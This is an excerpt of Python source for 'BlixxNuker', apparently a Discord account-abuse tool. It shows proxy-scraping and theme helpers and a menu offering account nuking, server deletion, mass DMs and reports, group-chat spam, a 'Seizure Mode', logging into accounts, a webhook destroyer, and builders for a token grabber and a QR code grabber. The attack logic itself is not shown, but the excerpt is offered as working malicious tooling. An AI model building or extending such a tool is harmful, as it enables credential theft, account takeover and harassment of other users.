...
def setTitle(_str):
    system = os.name
    if system == "nt":
        ctypes.windll.kernel32.SetConsoleTitleW(f"{_str} | Made By Blixx")
    elif system == "posix":
        sys.stdout.write(f"\x1b]0;{_str} | Made By Blixx\x07")
    else:
        pass
...
def proxy_scrape():
    ...
    startTime = time.time()
    temp = getTempDir() + "\\Blixx_proxies"
    print(
        f"{Fore.YELLOW}Please wait while BlixxNuker Scrapes proxies for you!{Fore.RESET}"
    )
...
def getTheme():
    themes = ["Blixxe", "dark", "fire", "water", "neon"]
    with open(getTempDir() + "\\blixx_theme", "r") as f:
        text = f.read()
...
def setTheme(new: str):
    with open(getTempDir() + "\\Blixx_theme", "w"):
        pass
    with open(getTempDir() + "\\Blixx_theme", "w") as f:
        f.write(new)
...
{Fore.RESET}[{Fore.WHITE}1{Fore.RESET}]{Fore.LIGHTBLACK_EX} Nuke Account                                |{Fore.RESET}[{Fore.WHITE}10{Fore.RESET}]{Fore.LIGHTBLACK_EX} Block Friends
{Fore.RESET}[{Fore.WHITE}2{Fore.RESET}]{Fore.LIGHTBLACK_EX} Unfriend all friends                        |{Fore.RESET}[{Fore.WHITE}11{Fore.RESET}]{Fore.LIGHTBLACK_EX} Profile Changer
{Fore.RESET}[{Fore.WHITE}3{Fore.RESET}]{Fore.LIGHTBLACK_EX} Delete and leave all servers                |{Fore.RESET}[{Fore.WHITE}12{Fore.RESET}]{Fore.LIGHTBLACK_EX} [Coming Soon] 
{Fore.RESET}[{Fore.WHITE}4{Fore.RESET}]{Fore.LIGHTBLACK_EX} Spam Create New servers                     |{Fore.RESET}[{Fore.WHITE}13{Fore.RESET}]{Fore.LIGHTBLACK_EX} Create Token Grabber 
{Fore.RESET}[{Fore.WHITE}5{Fore.RESET}]{Fore.LIGHTBLACK_EX} Dm Deleter                                  |{Fore.RESET}[{Fore.WHITE}14{Fore.RESET}]{Fore.LIGHTBLACK_EX} QR Code grabber
{Fore.RESET}[{Fore.WHITE}6{Fore.RESET}]{Fore.LIGHTBLACK_EX} Mass Dm                                     |{Fore.RESET}[{Fore.WHITE}15{Fore.RESET}]{Fore.LIGHTBLACK_EX} Mass Report
{Fore.RESET}[{Fore.WHITE}7{Fore.RESET}]{Fore.LIGHTBLACK_EX} Enable Seizure Mode                         |{Fore.RESET}[{Fore.WHITE}16{Fore.RESET}]{Fore.LIGHTBLACK_EX} GroupChat Spammer
{Fore.RESET}[{Fore.WHITE}8{Fore.RESET}]{Fore.LIGHTBLACK_EX} Get information from a targetted account    |{Fore.RESET}[{Fore.WHITE}17{Fore.RESET}]{Fore.LIGHTBLACK_EX} Webhook Destroyer
{Fore.RESET}[{Fore.WHITE}9{Fore.RESET}]{Fore.LIGHTBLACK_EX} Log into an account                         |{Fore.RESET}[{Fore.WHITE}18{Fore.RESET}]{Fore.RED} Settings
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────"""
        )
